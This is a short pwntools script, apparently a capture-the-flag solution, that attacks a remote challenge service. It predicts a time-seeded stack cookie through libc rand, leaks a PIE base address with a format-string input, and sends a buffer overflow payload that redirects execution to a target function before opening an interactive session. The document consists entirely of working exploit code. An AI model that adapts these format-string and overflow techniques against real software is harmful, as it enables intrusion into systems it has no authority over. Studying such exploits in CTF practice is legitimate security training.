from pwn import *
from ctypes import CDLL
r = remote('ctf.umbccd.io', 4200)
#get rand() of srand(time(0))
lib = CDLL('libc.so.6')
lib.srand(lib.time(0))
cookie = p32(lib.rand())
#grab PIE addr
r.sendlineafter('name?\n', '%llx') #or '%6$llx'
r.recvuntil(', ')
pie_base = int(r.recvline(), base=16)-0x2082 #or 0x10d0
print('PIE addr: %s' % hex(pie_base))
#jump to solution
r.sendlineafter('?\n', 'A'*13+cookie+'A'*8+p64(pie_base+0x11b5))
r.interactive()
